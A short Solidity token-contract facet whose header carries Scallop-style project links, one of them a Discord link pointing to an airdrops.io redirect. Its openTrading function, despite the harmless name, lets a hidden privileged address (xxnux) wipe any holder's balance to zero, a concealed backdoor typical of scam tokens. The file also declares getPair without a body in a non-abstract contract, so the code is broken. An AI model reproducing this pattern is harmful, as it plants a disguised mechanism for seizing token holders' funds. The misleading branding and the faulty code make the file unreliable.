/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.scallop.io/
 * Whitepaper: https://docs.scallop.io/
 * Twitter: https://twitter.com/Scallop_io
 * Telegram Group: https://t.me/scallop_io
 * Discord Chat: https://airdrops.io/visit/0ll2/
 * Medium: https://medium.com/scallopio
 */
pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract getPairFacet {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
    function pancakePair() public view virtual returns (address) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return
            IPancakeFactory(ds.FACTORY).getPair(
                address(ds.WETH),
                address(this)
            );
    }
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ds.ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
}
